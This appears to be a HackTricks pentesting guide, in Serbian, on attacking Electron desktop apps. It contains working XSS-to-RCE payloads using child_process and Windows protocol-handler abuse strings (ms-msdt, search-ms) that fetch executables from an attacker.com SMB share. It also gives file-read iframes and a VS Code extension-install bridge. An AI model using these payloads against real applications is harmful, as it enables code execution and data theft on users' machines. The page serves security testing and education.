# Electron desktop aplikacije

{{#include ../../banners/hacktricks-training.md}}

## Uvod

Electron kombinuje privilegovani glavni proces **Node.js** sa procesima renderer-a **Chromium**. Electron nije veb pregledač: kod aplikacije može namerno da izloži mogućnosti kao što su pristup datotečnom sistemu i shell-u, pa učitavanje nepouzdanog sadržaja zahteva stroži dizajn granica nego kod običnog veb-sajta.<sup>[[21]](#references)</sup>

Kod Electron aplikacije obično se pakuje u `.asar` arhivu. Raspakujte je pre pregleda izvornog koda:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

Datoteka `package.json` aplikacije navodi njenu glavnu ulaznu tačku. Ta datoteka obično kreira prozore za renderer i podešava njihove bezbednosno osetljive `webPreferences`.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron ima dva glavna tipa procesa:

- Main Process (ima potpun pristup NodeJS-u)
- Renderer Process (iz bezbednosnih razloga treba da ima ograničen pristup NodeJS-u)

![Electron desktop aplikacije - Uvod: Renderer Process (iz bezbednosnih razloga treba da ima ograničen pristup NodeJS-u)](<../../images/image (182).png>)

**Renderer Process** je prozor pregledača koji učitava datoteku:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**Glavni proces** konfiguriše svaki renderer proces, obično prilikom kreiranja `BrowserWindow` objekta. Bezbedna podešavanja smanjuju verovatnoću da kompromitovanje renderer procesa dovede do izvršavanja nativnog koda, ali ne čine nepouzdan sadržaj sam po sebi bezbednim.<sup>[[21]](#references)[[22]](#references)</sup>

Proverite bar sledeće postavke renderer procesa:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** je podrazumevano `false`. Ako ga omogućite, JavaScript renderer procesa dobija pristup Node.js API-jima, a za taj renderer proces se isključuje i sandbox.
- **`contextIsolation`** je podrazumevano `true`. Njime se JavaScript kontekst stranice odvaja od konteksta koji koriste preload skripte i Electron interne komponente.
- **`preload`** nema podrazumevanu putanju. Konfigurisana preload skripta pokreće se pre skripti stranice i može da izloži API-je uskog opsega putem `contextBridge`.
- **`sandbox`** je podrazumevano `true` od Electron 20. Ograničava pristup renderer procesa resursima operativnog sistema; podešavanje `nodeIntegration: true` ga isključuje.
- **`nodeIntegrationInWorker`** je podrazumevano `false` i kontroliše Node.js integraciju u Web Workers.
- **`nodeIntegrationInSubFrames`** je podrazumevano `false`.
  - Ako je **`nodeIntegration`** **omogućen**, to omogućava korišćenje **Node.js API-ja** u veb-stranicama **učitanim u iframe-ovima** unutar Electron aplikacije.
  - Ako je **`nodeIntegration`** **onemogućen**, preload skripte će se učitavati u iframe-u

Primer konfiguracije:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Neki **RCE payloads** sa [ove stranice](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Presretanje saobraćaja

Izmenite konfiguraciju start-main i dodajte upotrebu proxy servera kao što je:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Statičko praćenje granice od ASAR-a do native koda pomoću REA

**REA** može da čita ASAR ili izdvojeni direktorijum aplikacije bez izvršavanja njenog JavaScript bootstrap-a. Graf aplikacije beleži ulazne tačke paketa, objedinjene module, podešavanja za `BrowserWindow` i preload, članove `contextBridge`, IPC registracije, zahteve za native dodatke i identitete source map-ova. To daje početnu tačku za praćenje mogućnosti izložene rendereru do privilegovanog rukovaoca u glavnom procesu.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Za doslovni string funkcije, prosledite kompletan zapis Evidence kao `application` i zamenite seed onim koji je uočen na ciljnom sistemu:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Isti workflow `trace_application_feature` prihvata i uočeni doslovni API member, IPC channel ili module kao početnu tačku. Proverite dobijenu putanju handlera, kandidate za validaciju i native handoff u odnosu na vraćene izvorne lokacije. Renderer `invoke` uparuje se samo sa jednim jedinstvenim kandidatom `ipcMain.handle`/`handleOnce` na istom doslovnom channel-u; `send` slično zahteva jednog jedinstvenog kandidata `ipcMain.on`/`once`/`addListener`. Dinamički ili duplirani handleri ostaju nerazrešeni. Traženi `.node` member nije potvrđen native export; odgovarajući dokazi iz Hopper/Ghidra moraju imati isti digest artefakta da bi se izveo taj zaključak. Statička dostižnost takođe ne dokazuje da je putanja izvršena.<sup>[[24]](#references)[[25]](#references)</sup>

Za granicu poverenja renderer-to-main i validaciju handlera, pogledajte [Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md).

Za native naknadnu analizu vezanu za provajdera, pogledajte [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Površina napada Electron auto-update-a

Za integritet feed-a izdanja, rollback, zabunu oko potpisanih kanala i TOCTOU u staging datotekama, pogledajte [Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md).

## Electron local code injection

Ako imate pristup za lokalno pisanje ili instrumentaciju instalirane aplikacije, pogledajte [Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md) za ASAR/main-process i V8 snapshot putanje, kao i linkove specifične za OS.

## RCE: XSS + nodeIntegration

Ako je **nodeIntegration** podešen na **on**, JavaScript veb-stranice može lako da koristi Node.js funkcije jednostavnim pozivanjem `require()`. Na primer, način za pokretanje aplikacije calc u Windows-u je:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Skripta navedena u ovom podešavanju **učitava se pre ostalih skripti u renderer-u**, pa ima **neograničen pristup Node API-jima**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Dakle, skripta može da izveze node-features na stranice:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Ako je `contextIsolation` uključen, ovo neće raditi**

## RCE: XSS + contextIsolation

_**contextIsolation**_ uvodi **odvojene kontekste za skripte veb-stranice i interni JavaScript kod Electron-a**, tako da izvršavanje JavaScript-a u jednom kodu ne utiče na drugi. Ovo je neophodna funkcija za uklanjanje mogućnosti za RCE.

Ako konteksti nisu izolovani, napadač može da:

1. Izvrši **proizvoljan JavaScript u renderer-u** (XSS ili navigacija ka spoljnim sajtovima)
2. **Zameni ugrađenu metodu** koju koristi preload ili interni Electron kod sopstvenom funkcijom
3. **Pokrene** korišćenje **zamenjene funkcije**
4. RCE?

Postoje 2 mesta na kojima ugrađene metode mogu biti zamenjene: u preload kodu ili internom Electron kodu:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Zaobilaženje događaja klika

Ako postoje ograničenja koja se primenjuju kada kliknete na link, možda ćete moći da ih zaobiđete **srednjim klikom** umesto uobičajenim levim klikom.

```javascript
window.addEventListener('click', (e) => {
```

## RCE via shell.openExternal

Za više informacija o ovim primerima pogledajte [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) i [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Prilikom postavljanja Electron desktop aplikacije, ključno je obezbediti ispravna podešavanja za `nodeIntegration` i `contextIsolation`. Utvrđeno je da se **remote code execution (RCE) na strani klijenta**, usmeren na preload skripte ili Electron-ov nativni kod iz glavnog procesa, efektivno sprečava kada su ova podešavanja uključena.

Kada korisnik stupi u interakciju sa linkovima ili otvori nove prozore, aktiviraju se određeni event listener-i, koji su ključni za bezbednost i funkcionalnost aplikacije:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Ovi listener-i su **nadjačani desktop aplikacijom** kako bi implementirali sopstvenu **poslovnu logiku**. Aplikacija procenjuje da li navigiranu vezu treba otvoriti interno ili u spoljašnjem veb pregledaču. Ova odluka se obično donosi pomoću funkcije `openInternally`. Ako ova funkcija vrati `false`, to znači da vezu treba otvoriti spolja, korišćenjem funkcije `shell.openExternal`.

**Pojednostavljeni pseudokod:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Preporuke za bezbednost Electron JS-a savetuju da se funkciji `openExternal` ne prosleđuje nepouzdan sadržaj, jer to može dovesti do RCE-a putem različitih protokola. Operativni sistemi podržavaju različite protokole koji mogu pokrenuti RCE. Detaljne primere i dodatna objašnjenja o ovoj temi možete pronaći u [ovom izvoru](https://positive.security/blog/url-open-rce#windows-10-19042), koji sadrži primere Windows protokola kojima se ova ranjivost može iskoristiti.<sup>[[10]](#references)</sup>

U macOS-u, funkcija `openExternal` može se iskoristiti za izvršavanje proizvoljnih komandi, na primer pomoću `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Primeri zloupotrebe Windows protokola uključuju:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + ranjivi preload IPC + shell.openExternal

Ova vuln se može pronaći u **[ovom izveštaju](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

**webviewTag** je **zastarela funkcija** koja omogućava korišćenje **NodeJS-a** u **renderer procesu** i trebalo bi da bude onemogućena jer omogućava učitavanje skripte unutar preload konteksta, na primer:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Dakle, napadač koji uspe da učita proizvoljnu stranicu mogao bi da iskoristi tu oznaku da **učita proizvoljnu preload skriptu**.

Ova preload skripta je zatim zloupotrebljena za pozivanje **ranjivog IPC servisa (`skype-new-window`)**, koji je pozivao **`shell.openExternal`** da bi se dobio RCE:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Čitanje internih datoteka: XSS + contextIsolation

**Isključivanje `contextIsolation` omogućava upotrebu oznaka `<webview>`**, slično kao `<iframe>`, za čitanje i eksfiltraciju lokalnih datoteka. U prikazanom primeru pokazano je kako se ova ranjivost može iskoristiti za čitanje sadržaja internih datoteka:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Čitanje internih datoteka: XSS + contextIsolation: Isključivanje contextIsolation omogućava upotrebu oznaka , slično kao , za...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Pored toga, opisan je još jedan način za **čitanje interne datoteke**, uz isticanje kritične ranjivosti koja omogućava čitanje lokalnih datoteka u Electron desktop aplikaciji. To podrazumeva ubacivanje skripte radi iskorišćavanja aplikacije i eksfiltracije podataka:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Old Chromium**

Ako je verzija **Chromium**-a koja dolazi uz aplikaciju stara i ima poznate ranjivosti, možda je moguće iskoristiti ih i pretvoriti XSS u RCE.<sup>[[20]](#references)</sup>\
Primer možete videti u ovom **writeup**-u: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **XSS phishing zaobilaženjem regex-a za interne URL-ove**

Ako pronađete XSS, ali **ne možete da pokrenete RCE niti da ukradete interne datoteke**, i dalje možete pokušati da **ukradete akreditive putem phishinga**.<sup>[[1]](#references)</sup>

Prvo pregledajte frontend kod da biste utvrdili šta se dešava kada se otvori novi URL:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

Poziv funkcije **`openInternally`** određuje da li će se platformska veza otvoriti u **desktop prozoru** ili će se resurs treće strane otvoriti u sistemskom pregledaču.

Ako se regex allowliste URL-ova u funkciji može zaobići — na primer, zato što tačke u imenu hosta nisu escapovane — napadač bi mogao da zloupotrebi XSS i prikaže uverljiv prompt za unos kredencijala na infrastrukturi koju kontroliše:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://` protokol

Kao što je navedeno u [Electron vodiču za bezbednost](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), stranice koje se pokreću preko **`file://`** imaju širok pristup datotekama. Zbog toga se **XSS može iskoristiti za učitavanje proizvoljnih datoteka** sa korisnikove mašine. Pravilno osmišljen **custom protocol** može da ograniči pristup na određeni skup datoteka.<sup>[[21]](#references)</sup>

Za zasebno zaobilaženje ograničenja opsega datoteka u kontekstu workera u pregledima desktop asistenata, pogledajte [Granice poverenja u ugrađenim pregledačima AI asistenata](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope).

## Remote modul

Electron Remote modul omogućava **renderer procesima pristup API-jima main procesa**, što olakšava komunikaciju unutar Electron aplikacije. Međutim, omogućavanje ovog modula uvodi značajne bezbednosne rizike. Proširuje površinu za napad aplikacije i čini je podložnijom ranjivostima, kao što su napadi cross-site scripting (XSS).

> [!TIP]
> Iako **remote** modul izlaže neke API-je iz main procesa renderer procesima, nije jednostavno dobiti RCE samo zloupotrebom komponenti. Međutim, komponente mogu izložiti osetljive informacije.

> [!WARNING]
> Mnoge aplikacije koje i dalje koriste remote modul to rade na način koji **zahteva da NodeIntegration bude omogućen** u renderer procesu, što predstavlja **ogroman bezbednosni rizik**.

Electronov ugrađeni modul `remote` je zastareo, a zatim uklonjen; aplikacije kojima je i dalje potreban njegov model mogu da koriste zaseban paket `@electron/remote`. Zbog bezbednosnih i performansnih posledica, izbegavajte izlaganje remote mogućnosti rendererima kojima se ne veruje.

Uz `@electron/remote`, prvo ga je potrebno **inicijalizovati u main procesu**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Renderer proces zatim može da uveze objekte iz modula:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

**[objava na blogu](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** navodi neke zanimljive **funkcije** koje izlaže objekat **`app`** iz remote modula:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Ponovo pokreće** aplikaciju tako što **izlazi** iz trenutne instance i **pokreće** novu. Korisno za **ažuriranja aplikacije** ili značajne **promene stanja**.
- **`app.setAppLogsPath([path])`**  
   - **Definiše** ili **kreira** direktorijum za čuvanje **logova aplikacije**. Logovi se mogu **preuzeti** ili **izmeniti** pomoću funkcija **`app.getPath()`** ili **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Registruje** trenutni izvršni fajl kao **podrazumevani rukovalac** za navedeni **protokol**. Po potrebi možete navesti **prilagođenu putanju** i **argumente**.
- **`app.setUserTasks(tasks)`**  
   - **Dodaje** zadatke u kategoriju **Tasks** na **Jump List**-u (u Windows-u). Svaki zadatak može da kontroliše kako se aplikacija **pokreće** ili koji se **argumenti** prosleđuju.
- **`app.importCertificate(options, callback)`**  
   - **Uvozi** **PKCS#12 sertifikat** u sistemsko **skladište sertifikata** (samo na Linux-u). Za obradu rezultata može se koristiti **callback**.
- **`app.moveToApplicationsFolder([options])`**  
   - **Premešta** aplikaciju u fasciklu **Applications** (u macOS-u). Pomaže da se obezbedi **standardna instalacija** za korisnike Mac-a.
- **`app.setJumpList(categories)`**  
   - **Postavlja** ili **uklanja** prilagođeni **Jump List** u **Windows-u**. Možete da navedete **kategorije** za organizovanje načina na koji se zadaci prikazuju korisniku.
- **`app.setLoginItemSettings(settings)`**  
   - **Podešava** koji se **izvršni fajlovi** pokreću pri **prijavi**, zajedno sa njihovim **opcijama** (samo na macOS-u i Windows-u).
  
Primer:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences modul

**Primarni API** za pristup sistemskim podešavanjima i **emitovanje sistemskih događaja** u Electron-u. Metode kao što su **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** i **setUserDefault** sve su **deo** ovog modula.

**Primer upotrebe:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Sluša** **native macOS notifications** koristeći NSDistributedNotificationCenter.  
* Pre **macOS Catalina**, mogli ste da sniff-ujete **sva** distribuirana obaveštenja prosleđivanjem vrednosti **nil** funkciji CFNotificationCenterAddObserver.  
* Posle **Catalina / Big Sur**, sandboxovane aplikacije i dalje mogu da se **pretplate** na **mnoge događaje** (na primer, **zaključavanje/otključavanje ekrana**, **montiranje volumena**, **mrežna aktivnost** itd.) registracijom obaveštenja **po imenu**.

### **getUserDefault / setUserDefault**

* **Interaguje** sa **NSUserDefaults**, koji na macOS-u čuva **podešavanja** aplikacije ili globalna podešavanja.
    
* **getUserDefault** može da **dohvati** osetljive informacije, kao što su **lokacije nedavno korišćenih datoteka** ili **geografska lokacija korisnika**.
    
* **setUserDefault** može da **izmeni** ova podešavanja, potencijalno utičući na **konfiguraciju** aplikacije.
    
* U **starijim verzijama Electron-a** (pre v8.3.0), bio je **dostupan** samo **standardni skup** vrednosti NSUserDefaults.

## Shell.showItemInFolder

Ova funkcija prikazuje datu datoteku u upravljaču datotekama. Na pogođenim platformama i verzijama, ta interakcija je **mogla automatski da izvrši datoteku**.

Za više informacija pogledajte [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Electron aplikacije treba da imaju **Content Security Policy (CSP)** kako bi **sprečile XSS napade**. **CSP** je **bezbednosni standard** koji pomaže da se **spreči** **izvršavanje** **nepouzdanog koda** u pregledaču.

Obično se **konfiguriše** u datoteci **`main.js`** ili u šablonu **`index.html`**, tako što se CSP navede unutar **meta taga**.

Za više informacija pogledajte:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

Ovaj lanac napada iz stvarnog sveta pogodio je Visual Studio Code 1.63 (CVE-2021-43908) i pokazuje kako jedan XSS izazvan Markdown-om u webview-u može da se eskalira do potpunog RCE-a kada su CSP, postMessage i rukovaoci šemama pogrešno konfigurisani. Javni PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Pregled lanca napada
- Prvi XSS preko CSP-a webview-a: Generisani CSP je uključivao `style-src 'self' 'unsafe-inline'`, što je omogućilo ubacivanje zasnovano na inline stilovima u kontekstu `vscode-webview://`. Payload je slao beacon na `/stealID` kako bi eksfiltrirao extensionId ciljnog webview-a.
- Formiranje URL-a ciljnog webview-a: Korišćenjem leaked ID-a za izradu adrese `vscode-webview://<extensionId>/.../<publicUrl>`.
- Drugi XSS preko poverenja u postMessage: Spoljašnji webview je verovao `window.postMessage` bez provera porekla/tipa, i učitavao HTML napadača sa `allowScripts: true`.
- Učitavanje lokalne datoteke preko prepravljanja šeme/putanje: Payload je prepravio `file:///...` u `vscode-file://vscode-app/...` i zamenio `exploit.md` sa `RCE.html`, zloupotrebljavajući slabu proveru putanje radi učitavanja privilegovanog lokalnog resursa.
- RCE u kontekstu sa omogućenim Node-om: Učitani HTML se izvršavao uz dostupne Node API-je, omogućavajući izvršavanje OS komandi.

Primer RCE primitive u konačnom kontekstu
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Povezano štivo o problemima poverenja u `postMessage`:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: simulirane prečice u webview-u + deklarativni mostovi komandi ekstenzija

U junu 2026. pojavila se druga vrsta izlaska iz VS Code webview-a: **nepouzdani JavaScript unutar notebook/preview webview-a mogao je da simulira privilegovane globalne prečice**, jer je preload za webview prosleđivao podatke o `keydown` događajima host workbench-u, a host ih je obrađivao kao stvarni korisnički unos.<sup>[[14]](#references)</sup>

Ovo je deo šire istorije napada na granice poverenja u IDE-ovima, pri kojima sadržaj pod kontrolom projekta dolazi do privilegovanih funkcija editora.<sup>[[19]](#references)</sup>

### Propust na granici poverenja

Ako cross-origin/sandboxed webview kopira polja tastature koja kontroliše napadač (`key`, `code`, `keyCode`, modifikatori, `repeat`) u privilegovani `postMessage`/message-port bridge **bez provere `event.isTrusted`**, JavaScript unutar webview-a može da aktivira prečice workbench-a pomoću:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Ovo je posebno korisno kada pregledač **blokira sintetičko kucanje**. Skriptovani događaji tastera obično **ne mogu da unesu proizvoljan tekst u HTML elemente `<input>`**, ali i dalje mogu da aktiviraju prečice koje direktno obrađuju `keydown`.

### Praktični obrasci zloupotrebe

- **Zloupotreba korisničkog interfejsa putem prečica:** ciljajte globalne prečice, kao što su prihvatanje obaveštenja, navigacija kroz paletu, aktiviranje fokusiranog dugmeta ili kretanje kroz meni, umesto pokušaja unosa komandi.
- **Predvidivi privilegovani upiti na osnovu metapodataka radnog prostora:** `.vscode/extensions.json` koji kontroliše repozitorijum može da preporuči napadačevo proširenje i izazove predvidivo obaveštenje o instalaciji koje se može prihvatiti prečicom kao što je `Ctrl+Shift+A`.
- **Deklarativni manifest proširenja kao most za komande:** čak i ako CSP blokira lokalni kod proširenja radnog prostora u web verziji VS Code-a, deklarativni doprinosi u `package.json` i dalje mogu da se učitaju. Lokalno proširenje u `.vscode/extensions` može da registruje prečicu koja poziva `runCommands`, a zatim privilegovanu internu komandu kao što je `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Primer obrasca manifesta:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Skrivene bezbednosne zastavice dostupne preko nepouzdanih metapodataka:** ako interna komanda prihvata argumente pod kontrolom napadača kao što je `{"context":{"skipPublisherTrust":true}}`, deklarativni metapodaci mogu da potisnu dijalog poverenja i instaliraju ekstenziju hostovanu na Marketplace-u/CDN-u, koja zatim izvršava kod napadača.
- **Zloupotreba pouzdanog workspace-a:** ako se udaljeni/web workspace-ovi automatski smatraju pouzdanim, lokalne ekstenzije workspace-a postaju vredan most od sadržaja repozitorijuma do privilegovanih radnji editora.
- **Proširivanje dometa nakon kompromitovanja:** nakon izvršavanja ekstenzije proverite kojim tokenima editor omogućava pristup ekstenzijama. U `github.dev`, ukradeni GitHub token važio je i izvan otvorenog repozitorijuma, pa je upit ka `https://api.github.com/user/repos` izlistao dodatne dostupne privatne repozitorijume.

### Napomene za audit

- Tretirajte **prosleđivanje unosa iz webview-a hostu** kao granicu privilegija; nikada nemojte ponovo prosleđivati sintetičke događaje tastera/klika iz nepouzdanih frejmova hostu.
- Sprovodite autorizaciju **unutar** osetljivih komandi. Nemojte prihvatati kontekst komande koji obezbeđuje pozivalac i koji može da postavi interne zastavice kao što je `skipPublisherTrust`.
- Nemojte pretpostavljati da je blokiranje lokalnog izvršivog koda ekstenzija dovoljno; proverite i **deklarativne doprinose** (`keybindings`, `menus`, `commands`, tasks) iz manifesta pod kontrolom workspace-a.
- Ispravke od 3. juna 2026. dodale su `isTrusted` prosleđenim događajima, onemogućile prosleđivanje nepouzdanih tastera u notebook webview-ovima i prestale da prihvataju kontekst komande za instalaciju koji dostavlja pozivalac.<sup>[[16]](#references)[[17]](#references)</sup>

## **Alati**

Kolekcija **awesome-electronjs-hacking** sadrži dodatne resurse za istraživanje, alate i ranjive aplikacije.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) je alat za prepoznavanje pogrešnih konfiguracija i bezbednosnih anti-pattern-a u aplikacijama zasnovanim na Electron-u.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) je open source VS Code plugin za Electron aplikacije koji koristi Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) proverava ranjivosti u bibliotekama trećih strana.
- [**Electro.ng**](https://electro.ng/) je komercijalni alat za bezbednosnu analizu Electron aplikacija.

## Laboratorije

Na [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) možete pronaći laboratorijsku vežbu za iskorišćavanje ranjivih Electron aplikacija.<sup>[[4]](#references)</sup>

Ove komande će vam pomoći da prođete kroz laboratorijsku vežbu:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Ranije objavljena adresa za postojeće obeleživače: [Electron desktop aplikacije](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Putanja cele stranice preusmerava ovde; istorijski fragment se ne održava.

## References

- [1] [Phishing i prikupljanje akreditiva u Electron aplikacijama](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Čitanje proizvoljnih datoteka u Facebook Messenger Desktop aplikaciji](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
